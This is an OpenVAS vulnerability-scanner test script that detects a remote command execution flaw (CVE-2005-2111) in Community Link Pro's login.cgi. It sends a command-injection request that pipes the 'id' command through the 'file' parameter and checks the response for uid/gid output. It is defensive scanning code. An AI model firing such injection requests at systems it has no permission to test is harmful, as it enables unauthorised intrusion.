# OpenVAS Vulnerability Test
# $Id: community_link_pro_login_remote_cmd_exec.nasl 17 2013-10-27 14:01:43Z jan $
# Description: Community Link Pro webeditor login.cgi remote command execution
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2005 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

include("revisions-lib.inc");
tag_summary = "The remote host is running Community Link Pro, a web-based application written
in Perl.

The remote version of this software contains a flaw in the script 'login.cgi'
which may allow an attacker to execute arbitrary commands on the remote host.";

tag_solution = "Disable or remove this CGI";

#  Ref: BADROOT SECURITY GROUP - mozako

 desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;


if(description)
{
 script_id(19305);
 script_version("$Revision: 17 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 15:01:43 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2006-03-26 17:55:15 +0200 (Sun, 26 Mar 2006)");
 script_bugtraq_id(14097);
 script_cve_id("CVE-2005-2111");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");
 name = "Community Link Pro webeditor login.cgi remote command execution";
 script_name(name);
 

 script_description(desc);
 
 summary = "Checks for Community Link Pro webeditor login.cgi remote execution flaw";
 
 script_summary(summary);
 script_category(ACT_GATHER_INFO);
 script_copyright("This script is Copyright (C) 2005 David Maciejak");
 family = "Web application abuses";
 script_family(family);
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);



http_check_remote_code (
                        check_request:"/login.cgi?username=&command=simple&do=edit&password=&file=|id|",
                        check_result:"uid=[0-9]+.*gid=[0-9]+.*",
                        command:"id",
                        description:desc,
			extra_dirs:make_list("/app/webeditor")
                        );

